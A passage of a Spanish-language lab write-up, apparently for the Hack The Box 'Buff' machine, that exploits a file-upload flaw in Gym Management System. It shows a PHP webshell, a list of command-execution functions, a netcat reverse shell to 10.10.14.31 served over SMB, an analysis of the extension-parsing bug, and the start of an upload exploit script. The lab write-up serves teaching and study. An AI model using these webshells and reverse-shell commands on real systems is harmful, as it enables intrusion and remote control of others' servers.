</span></span><span class=line><span class=cl>   <span class=m>3</span>   │ <span class=nb>echo</span> <span class=s2>&#34;Test&#34;</span>
</span></span><span class=line><span class=cl>   <span class=m>4</span>   │ ?&gt;
</span></span><span class=line><span class=cl>───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>                                                                                                               
</span></span><span class=line><span class=cl>&gt; file test.php
</span></span><span class=line><span class=cl>test.php: GIF image data <span class=m>16188</span> x <span class=m>26736</span>
</span></span></code></pre></div><p>Para que se entienda mejor vamos a cambiar los magic bytes del script a los de <strong>GIF8;</strong>, aunque tal y como viene por default ya funciona</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>PNG_magicBytes</span> <span class=o>=</span> <span class=s1>&#39;GIF8;&#39;</span>
</span></span></code></pre></div><p>Por último ejecutamos el script</p><pre tabindex=0><code>&gt; python2 48506.py http://10.10.10.198:8080/
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
            /\omo instalar mona.py en Immunity Debugger
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU=====================&#34;
            \/

[+] Successfully connected to webshell.
F8;&gt; 
</code></pre><p>Ahora ya tenemos una shell que en verdad no es una shell, me explico, simplemente hemos subido un script en php que ejecuta todo lo que le pasamos por el parámetro <strong>telepathy</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl <span class=s2>&#34;http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami&#34;</span>
</span></span><span class=line><span class=cl>GIF8<span class=p>;</span>
</span></span><span class=line><span class=cl>buff<span class=se>\s</span>haun
</span></span></code></pre></div><details><summary>Qué código tiene kamehameha.php que nos permite ejecutar comandos?</summary><p>El archivo <strong>kamehameha.php</strong> tiene el siguiente código</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;telepathy&#34;</span><span class=p>]);</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>Lo que hace básicamente es pasarle a la función shell_exec todo lo que recibe por GET por el parámetro telepathy.</p><p>La función shell_exec lo que hace es ejecutar comandos en el sistema, pero no muestra el output, para hacer que muestre el output hay que poner el echo delante</p><p><strong>Sin echo</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>d3bo</span><span class=o>~&gt;</span> <span class=nx>cat</span> <span class=nx>test</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>   <span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s2>&#34;whoami&#34;</span><span class=p>)</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>d3bo~&gt; php test.php
</span></span></span></code></pre></div><p><strong>Con echo</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>d3bo</span><span class=o>~&gt;</span> <span class=nx>cat</span> <span class=nx>test</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>   <span class=o>&lt;?</span><span class=nx>php</span> <span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s2>&#34;whoami&#34;</span><span class=p>)</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>d3bo~&gt; php test.php
</span></span></span><span class=line><span class=cl><span class=err>d3bo
</span></span></span></code></pre></div><p>Si shell_exec no funcionara o está bloqueado, se pueden usar otras funciones, a continuación os dejo unos ejemplos</p><p><strong>system()</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>d3bo</span><span class=o>~&gt;</span> <span class=nx>cat</span> <span class=nx>test</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>   <span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;whoami&#34;</span><span class=p>)</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>d3bo~&gt; php test.php
</span></span></span><span class=line><span class=cl><span class=err>d3bo
</span></span></span></code></pre></div><p><strong>passthru()</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>d3bo</span><span class=o>~&gt;</span> <span class=nx>cat</span> <span class=nx>test</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>   <span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>passthru</span><span class=p>(</span><span class=s2>&#34;whoami&#34;</span><span class=p>)</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>d3bo~&gt; php test.php
</span></span></span><span class=line><span class=cl><span class=err>d3bo
</span></span></span></code></pre></div><p><strong>exec()</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>d3bo</span><span class=o>~&gt;</span> <span class=nx>cat</span> <span class=nx>test</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>   <span class=o>&lt;?</span><span class=nx>php</span> <span class=k>echo</span> <span class=nx>exec</span><span class=p>(</span><span class=s2>&#34;whoami&#34;</span><span class=p>)</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>d3bo~&gt; php test.php
</span></span></span><span class=line><span class=cl><span class=err>d3bo                                                                                                                                                            
</span></span></span></code></pre></div><p><strong>popen()</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>d3bo</span><span class=o>~&gt;</span> <span class=nx>cat</span> <span class=nx>test</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>   <span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span>   <span class=nv>$handle</span> <span class=o>=</span> <span class=nx>popen</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=mi>3</span>   <span class=nv>$read</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$handle</span><span class=p>,</span> <span class=mi>2096</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=mi>4</span>   <span class=nx>pclose</span><span class=p>(</span><span class=nv>$handle</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=mi>5</span>   <span class=k>echo</span> <span class=nv>$read</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=mi>6</span>   <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>   7
</span></span></span><span class=line><span class=cl><span class=err>d3bo~&gt; php test.php
</span></span></span><span class=line><span class=cl><span class=err>d3bo
</span></span></span></code></pre></div></details><br><p>Vamos a usar este RCE para mandarnos una Reverse Shell en condiciones.</p><p>Para ello primero buscamos un nc.exe que normalmente en kali ya viene instalado, después nos lo movemos al directorio actual y abrimos un servidor con samba para poder ejecutarlo desde la otra máquina</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; locate nc.exe
</span></span><span class=line><span class=cl>/home/d3b0o/Desktop/buff/nc.exe
</span></span><span class=line><span class=cl>/opt/SecLists/Web-Shells/FuzzDB/nc.exe
</span></span><span class=line><span class=cl>/usr/lib/mono/4.5/cert-sync.exe
</span></span><span class=line><span class=cl>/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
</span></span><span class=line><span class=cl>/usr/share/windows-resources/binaries/nc.exe
</span></span><span class=line><span class=cl>                                                                                                                                                                                                                        
</span></span><span class=line><span class=cl>&gt; cp /usr/share/windows-resources/binaries/nc.exe .
</span></span><span class=line><span class=cl>                                                                                                                                                                                                                        
</span></span><span class=line><span class=cl>&gt; impacket-smbserver smb <span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span> -smb2support
</span></span><span class=line><span class=cl>Impacket v0.11.0 - Copyright <span class=m>2023</span> Fortra
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Callback added <span class=k>for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Callback added <span class=k>for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span></code></pre></div><p>Nos ponemos en escucha por el puerto 443</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rlwrap nc -nlvp <span class=m>443</span>
</span></span></code></pre></div><p>Por último aprovechándonos del RCE vamos a ejecutar el siguiente comando</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>//10.10.14.31/smb/nc.exe -e cmd 10.10.14.31 <span class=m>443</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -s -G <span class=s2>&#34;http://10.10.10.198:8080/upload/kamehameha.php&#34;</span> --data-urlencode <span class=s2>&#34;telepathy=//10.10.14.31/smb/nc.exe -e cmd 10.10.14.31 443&#34;</span>
</span></span></code></pre></div><p>¡Recibimos la reverse shell !!!</p><h2 id=analizando-la-vulnerabilidad>Analizando la vulnerabilidad<a href=#analizando-la-vulnerabilidad class=anchor aria-hidden=true>#</a></h2><p>¿Porque conseguimos ejecutar comandos? Que está mal en el código del upload.php?</p><p>Dentro de los exploits de exploidb suele haber un enlace para descargar la aplicación vulnerable, en este caso el enlace es https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/</p><p>Desde ahí, nos descargamos el código. Una vez descargado y descomprimido podemos ver el contenido del archivo upload.php que es el que hemos usado para subir un archivo php malicioso</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include_once</span> <span class=s1>&#39;include/db_connect.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>include_once</span> <span class=s1>&#39;include/functions.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$user</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$allowedExts</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;jpg&#34;</span><span class=p>,</span> <span class=s2>&#34;jpeg&#34;</span><span class=p>,</span> <span class=s2>&#34;gif&#34;</span><span class=p>,</span> <span class=s2>&#34;png&#34;</span><span class=p>,</span><span class=s2>&#34;JPG&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$extension</span> <span class=o>=</span> <span class=o>@</span><span class=nx>end</span><span class=p>(</span><span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pupload&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(((</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;type&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;image/gif&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;type&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;image/jpeg&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;type&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;image/JPG&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;type&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;image/png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;type&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;image/pjpeg&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;size&#34;</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>20000000000000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;&amp;</span> <span class=nx>in_array</span><span class=p>(</span><span class=nv>$extension</span><span class=p>,</span> <span class=nv>$allowedExts</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Return Code: &#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;upload/&#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;upload/&#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nv>$pic</span><span class=o>=</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=nv>$conv</span><span class=o>=</span><span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span><span class=nv>$pic</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$ext</span><span class=o>=</span><span class=nv>$conv</span><span class=p>[</span><span class=s1>&#39;1&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;upload/&#34;</span><span class=o>.</span> <span class=nv>$user</span><span class=o>.</span><span class=s2>&#34;.&#34;</span><span class=o>.</span><span class=nv>$ext</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nv>$url</span><span class=o>=</span><span class=nv>$user</span><span class=o>.</span><span class=s2>&#34;.&#34;</span><span class=o>.</span><span class=nv>$ext</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nv>$query</span><span class=o>=</span><span class=s2>&#34;update members set pic=1, picName=&#39;</span><span class=si>$url</span><span class=s2>&#39; where id=&#39;</span><span class=si>$user</span><span class=s2>&#39;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span><span class=p>(</span><span class=nv>$upl</span><span class=o>=</span><span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$query</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>          <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;location: profile/i.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;location: /profile/i.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>Al principio del script se declaran unas variables:</p><ul><li>user, que equivale a lo que le pasamos por get, por el parámetro id,</li><li>allowedExts, esta variable es una array con todas las extensiones permitidas (jpg,png,gif&mldr;)</li><li>extensión, guarda la extensión del archivo de la siguiente forma</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$extension</span> <span class=o>=</span> <span class=o>@</span><span class=nx>end</span><span class=p>(</span><span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]));</span>
</span></span></code></pre></div><p>Está haciendo uso de la función explode para separar el nombre en distintas partes separadas por &ldquo;.&rdquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>d3bo</span><span class=o>&gt;</span> <span class=nx>cat</span> <span class=nx>test</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>   <span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span>   <span class=nv>$test</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=s2>&#34;test.php.png&#34;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=mi>3</span>   <span class=nx>print_r</span><span class=p>(</span><span class=nv>$test</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=mi>4</span>   <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>d3bo&gt; php test.php
</span></span></span><span class=line><span class=cl><span class=err>Array
</span></span></span><span class=line><span class=cl><span class=err>(
</span></span></span><span class=line><span class=cl><span class=err>    [0] =&gt; test
</span></span></span><span class=line><span class=cl><span class=err>    [1] =&gt; php
</span></span></span><span class=line><span class=cl><span class=err>    [2] =&gt; png
</span></span></span><span class=line><span class=cl><span class=err>)
</span></span></span></code></pre></div><p>Además añade <code>@end</code> para que solo muestre el último</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>d3bo</span><span class=o>&gt;</span> <span class=nx>cat</span> <span class=nx>test</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>   <span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span>   <span class=nv>$test</span> <span class=o>=</span> <span class=o>@</span><span class=nx>end</span><span class=p>(</span><span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=s2>&#34;test.php.png&#34;</span> <span class=p>));</span>
</span></span><span class=line><span class=cl>   <span class=mi>3</span>   <span class=k>echo</span> <span class=nv>$test</span>
</span></span><span class=line><span class=cl>   <span class=mi>4</span>   <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>d3bo&gt; php test.php
</span></span></span><span class=line><span class=cl><span class=err>png                      
</span></span></span></code></pre></div><p>Con esto consigue sacar la extensión del archivo.</p><p>El código sigue con lo siguiente</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>if</span> <span class=o>(((</span><span class=nv>$_FILES</span><span class=o>[</span><span class=s2>&#34;file&#34;</span><span class=o>][</span><span class=s2>&#34;type&#34;</span><span class=o>]</span> <span class=o>==</span> <span class=s2>&#34;image/gif&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>||</span> <span class=o>(</span><span class=nv>$_FILES</span><span class=o>[</span><span class=s2>&#34;file&#34;</span><span class=o>][</span><span class=s2>&#34;type&#34;</span><span class=o>]</span> <span class=o>==</span> <span class=s2>&#34;image/jpeg&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>||</span> <span class=o>(</span><span class=nv>$_FILES</span><span class=o>[</span><span class=s2>&#34;file&#34;</span><span class=o>][</span><span class=s2>&#34;type&#34;</span><span class=o>]</span> <span class=o>==</span> <span class=s2>&#34;image/JPG&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>||</span> <span class=o>(</span><span class=nv>$_FILES</span><span class=o>[</span><span class=s2>&#34;file&#34;</span><span class=o>][</span><span class=s2>&#34;type&#34;</span><span class=o>]</span> <span class=o>==</span> <span class=s2>&#34;image/png&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>||</span> <span class=o>(</span><span class=nv>$_FILES</span><span class=o>[</span><span class=s2>&#34;file&#34;</span><span class=o>][</span><span class=s2>&#34;type&#34;</span><span class=o>]</span> <span class=o>==</span> <span class=s2>&#34;image/pjpeg&#34;</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;&amp;</span> <span class=o>(</span><span class=nv>$_FILES</span><span class=o>[</span><span class=s2>&#34;file&#34;</span><span class=o>][</span><span class=s2>&#34;size&#34;</span><span class=o>]</span> &lt; 20000000000000<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;&amp;</span> in_array<span class=o>(</span><span class=nv>$extension</span>, <span class=nv>$allowedExts</span><span class=o>))</span>
</span></span></code></pre></div><p>Aquí está haciendo 3 comprobaciones</p><ul><li>Content-Type: Primero comprueba si el content type es <code>image/gif</code> o <code>image/jpeg</code> o <code>image/JPG</code> o <code>image/png</code> o <code>image/pjpeg</code></li><li>Tamaño: También comprueba que el archivo sea más pequeño que 20,000,000,000,000 bytes</li><li>Extensión: Por último comprueba que la extensión del archivo este en la array allowedExts</li></ul><p>Si pasa todas estas validaciones pasa al la siguiente sección</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$pic</span><span class=o>=</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$conv</span><span class=o>=</span><span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span><span class=nv>$pic</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$ext</span><span class=o>=</span><span class=nv>$conv</span><span class=p>[</span><span class=s1>&#39;1&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;upload/&#34;</span><span class=o>.</span> <span class=nv>$user</span><span class=o>.</span><span class=s2>&#34;.&#34;</span><span class=o>.</span><span class=nv>$ext</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span><span class=o>=</span><span class=nv>$user</span><span class=o>.</span><span class=s2>&#34;.&#34;</span><span class=o>.</span><span class=nv>$ext</span><span class=p>;</span>
</span></span></code></pre></div><p>Aquí es donde empieza la vulnerabilidad</p><p>Vuelve a dividir el nombre en una array con la función explode usando de separador el &ldquo;.&rdquo; y guarda en la variable ext la posición 1 de la array. Después sube el archivo con el nombre del usuario que pasamos por GET y la extensión.</p><p>El problema es que no se está calculando bien la extensión, ya que si probamos de poner 2 extensiones, se queda con la primera</p><pre tabindex=0><code>d3bo&gt; cat test2.php
   1   &lt;?php
   2   $pic=&#34;shell.php.png&#34;;
   3   $conv=explode(&#34;.&#34;,$pic);
   4   $ext=$conv[&#39;1&#39;];
   5   echo $ext
   6   ?&gt;
d3bo&gt; php test2.php
php                                                   
</code></pre><p>El nombre <strong>shell.php.png</strong> pasaría todas las validaciones porque es un png, pero cuando se suba lo guardará con el nombre del usuario y la extensión php, ya que coge la 1 posición de la array en vez de la última</p><p>Para que no pasara esto se tendría que usar &lsquo;@end&rsquo; como se hacía al principio del código</p><pre tabindex=0><code>d3bo&gt; cat test2.php
   1   &lt;?php
   2   $pic=&#34;shell.php.png&#34;;
   3   $conv=explode(&#34;.&#34;,$pic);
   4   $ext=@end($conv);
   5   echo $ext
   6   ?&gt;
d3bo&gt; php test2.php
png
</code></pre><p>Podemos probar todo esto creando nuestro propio script</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;</span> <span class=n>cat</span> <span class=n>exploit</span><span class=o>.</span><span class=n>py</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=mi>1</span>   <span class=err>│</span> <span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span>   <span class=err>│</span> 
</span></span><span class=line><span class=cl>   <span class=mi>3</span>   <span class=err>│</span> <span class=k>def</span> <span class=nf>subir_archivo</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>   <span class=mi>4</span>   <span class=err>│</span>     <span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://10.10.10.198:8080/upload.php?id=user2&#39;</span>
</span></span><span class=line><span class=cl>   <span class=mi>5</span>   <span class=err>│</span>     <span class=n>contenido_archivo</span> <span class=o>=</span> <span class=s1>&#39;GIF8;</span><span class=se>\n</span><span class=s1> &lt;?php system(&#34;whoami&#34;) ?&gt;&#39;</span>
</span></span><span class=line><span class=cl>   <span class=mi>6</span>   <span class=err>│</span>     <span class=n>archivo</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;file&#39;</span><span class=p>:</span> <span class=p>(</span><span class=s1>&#39;shell.php.gif&#39;</span><span class=p>,</span> <span class=n>contenido_archivo</span><span class=p>,</span> <span class=s1>&#39;image/gif&#39;</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>   <span class=mi>7</span>   <span class=err>│</span>     <span class=n>fdata</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;pupload&#39;</span><span class=p>:</span> <span class=s1>&#39;upload&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=mi>8</span>   <span class=err>│</span>     <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>   <span class=mi>9</span>   <span class=err>│</span>         <span class=n>respuesta</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>archivo</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>fdata</span><span class=p>)</span>
